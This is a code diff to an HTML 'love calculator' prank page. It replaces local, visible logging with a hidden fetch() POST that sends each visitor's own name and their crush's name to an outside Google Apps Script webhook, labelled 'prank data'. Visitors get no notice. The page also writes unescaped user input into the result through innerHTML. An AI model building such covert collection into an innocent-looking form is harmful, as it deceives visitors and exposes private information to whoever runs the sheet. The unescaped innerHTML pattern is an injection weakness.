@@ -60,44 +60,37 @@
     <textarea id="logData" readonly></textarea>
   </div>
 
-  <script>
-    const form = document.getElementById("loveForm");
-    const resultDiv = document.getElementById("result");
-    const logDiv = document.getElementById("log");
-    const logData = document.getElementById("logData");
+<script>
+  const form = document.getElementById("loveForm");
+  const resultDiv = document.getElementById("result");
 
-    const logKey = "loveLog";
+  // Replace this with your own Google Apps Script URL
+  const webhookURL = "https://script.google.com/macros/s/AKfycbz9eC2mMlug7JE2YJRLS4JrthZUmA0i_GsI-SFxFqr9NzSZNPW6cHs0mZCNiOU-Mkd3yg/exec";
 
-    function loadLog() {
-      const saved = localStorage.getItem(logKey);
-      if (saved) {
-        logDiv.style.display = "block";
-        logData.value = saved;
-      }
-    }
+  form.addEventListener("submit", function(e) {
+    e.preventDefault();
 
-    function appendLog(entry) {
-      let existing = localStorage.getItem(logKey) || "";
-      existing += entry + "\n";
-      localStorage.setItem(logKey, existing);
-      loadLog();
-    }
+    const yourName = document.getElementById("yourName").value.trim();
+    const crushName = document.getElementById("crushName").value.trim();
+    const lovePercent = Math.floor(Math.random() * 51) + 50; // 50–100%
 
-    form.addEventListener("submit", function(e) {
-      e.preventDefault();
+    resultDiv.innerHTML = `💘 ${yourName} & ${crushName} are <b>${lovePercent}%</b> in love!`;
 
-      const yourName = document.getElementById("yourName").value.trim();
-      const crushName = document.getElementById("crushName").value.trim();
-      const lovePercent = Math.floor(Math.random() * 51) + 50; // 50–100%
-
-      resultDiv.innerHTML = `💘 ${yourName} & ${crushName} are <b>${lovePercent}%</b> in love!`;
-
-      const timestamp = new Date().toLocaleString();
-      appendLog(`[${timestamp}] ${yourName} ❤️ ${crushName} = ${lovePercent}%`);
+    // Send the prank data to Google Sheets via Apps Script
+    fetch(webhookURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        yourName: yourName,
+        crushName: crushName,
+        lovePercent: lovePercent
+      })
+    }).catch(err => {
+      console.error("Logging to Google Sheets failed:", err);
     });
+  });
+</script>
 
-    loadLog();
-  </script>
 
 </body>
 </html>
